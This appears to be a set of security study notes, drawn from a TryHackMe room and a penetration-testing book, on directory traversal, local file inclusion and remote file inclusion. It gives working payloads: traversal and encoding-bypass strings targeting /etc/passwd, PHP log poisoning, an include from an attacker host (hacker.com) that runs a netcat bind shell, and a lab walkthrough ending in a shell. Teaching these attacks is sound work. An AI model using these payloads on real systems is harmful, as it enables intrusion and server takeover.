# Directory/Path Traversal Attacks
Web applications often request files (e.g., images, documents) using **parameters** in URLs. These **query parameters** allow users to retrieve specific files or perform actions based on input.  

Example:  
When a user wants to access their CV, the request might be:  
`http://webapp.thm/get.php?file=userCV.pdf`  
Here, **`file=userCV.pdf`** is the parameter specifying which file to retrieve.  

Similarly, search engines like Google use parameters in GET requests:  
`https://www.google.com/search?q=TryHackMe`  

A **directory traversal attack** allows attackers to access files outside the web server's root directory by manipulating URL parameters. Typically, web servers restrict file access to a specific directory (e.g., `/var/www/html` in Apache), but improperly validated input can allow attackers to navigate beyond this restriction using sequences like `../../`.  

For example, an attacker might use:  
- `http://www.example.com/index.php?item=../../../../../etc/passwd` (to access sensitive system files)  
- `http://www.example.com/index.aspx?dat=../../../Windows/System32/cmd.exe?/C+dir+C:/` (to execute commands)  

**Bypassing Protections:**  
Simple filters blocking `../` can often be bypassed using techniques such as:  
- **Double encoding:** `%252e%252e%252fetc%252fpasswd`  
- **UTF-8 encoding:** `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`  
- **Obfuscation with extra characters:** `….//….//etc/passwd` or `/%5C../%5C../etc/passwd`  
___
## Local File Inclusion (LFI) Attacks

**Overview:**  
Local File Inclusion (LFI) attacks exploit vulnerabilities in web applications that dynamically include files without proper validation. If an attacker can control the file path parameter, they can manipulate it to include unintended files.  

**Example Vulnerable Code:**  
```
<?php
include($_GET['include']);
 ... Remaining code of the page ...
```  
A legitimate request might look like:  
`http://mysite.com/index.php?include=header.php`  

However, an attacker could exploit this to access sensitive files:  
`http://mysite.com/index.php?include=../../../../../../etc/passwd`  

**Impact:**  
- Initially, attackers gain read access to system files.  
- If they can inject executable code into a file (e.g., logs, databases, or uploads), they can achieve **Remote Code Execution (RCE)**.  

### **Exploiting LFI for Code Execution**  
1. **Injecting Malicious Code:**  
   - The attacker forces an error log entry by requesting a nonexistent file with embedded PHP code:  
     `http://mysite.com/unknown.xyz?id='<?php system(id)?>'`  
   - If logging is enabled, this gets stored in the web server logs (e.g., `/var/log/apache/access.log`).  

2. **Executing the Injected Code:**  
   - The attacker includes the log file via LFI, causing execution:  
     `http://mysite.com/index.php?include=../../../../../../var/log/apache/access.log`  
   - This can reveal system information like user IDs or be used to gain further access.  

### **Alternative Methods for Code Injection**  
If logs are inaccessible, attackers may insert code via:  
- **Database fields** (e.g., injecting PHP into form fields stored in a database).  
- **HTTP headers** (e.g., modifying the `User-Agent` field and including `/proc/self/environ`).  
- **Email attachments** (e.g., including email log files).  
- **Image uploads** (e.g., hiding PHP code inside image metadata).  
___

## Remote File Inclusion (RFI) Attacks  

**Overview:**  
Remote File Inclusion (RFI) is similar to Local File Inclusion (LFI) but allows attackers to include **external** files hosted on a remote server. This enables the execution of malicious scripts, potentially leading to **Remote Code Execution (RCE)**.  

**Key Requirements for RFI:**  
- The web server must **allow remote file inclusion** (e.g., `allow_url_include=On` in PHP).  
- The application must dynamically include files based on user input.  

### **Exploiting RFI**  
A vulnerable PHP script:  
```php
<?php
include($_GET['include']);
?>
```  
An attacker could provide an external malicious script:  
`http://mysite.com/index.php?include=http://hacker.com/badfile.txt`  

This script could contain:  
```php
<?php
system('nc -lp 8888 -e /bin/sh');
?>
```  
Once included, this command starts a **Netcat listener**, granting the attacker shell access.  

**Attack Execution:**  
1. The attacker hosts the malicious file (`cmd.txt`) on their server.  
2. They trigger the inclusion via:  
   `http://10.52.200.26/websec/file_inclusion/rfi.php?include=http://10.52.210.210/cmd.txt`  
3. The web server **executes the script**, establishing a backdoor.  
4. The attacker connects using Netcat:  
   `nc -n 10.52.200.26 8888`  
5. The attacker now has a shell on the server (`uid=33(www-data)`).  

### **Impact of RFI Attacks**  
- **Remote Code Execution (RCE):** Full control over the web server.  
- **Data Theft:** Access to sensitive files (database credentials, user data, etc.).  
- **Website Defacement:** Attackers can modify web content.  
- **Malware Injection:** Hosting and distributing malicious software.  

___
## Sources
- tryhackme, File Inclusion, https://tryhackme.com/room/fileinc.
- M. Kofler et all, Hacking and Security The Comprehensive Guide to Penetration Testing and Cybersecurity, Rheinwerk Publishing 2023


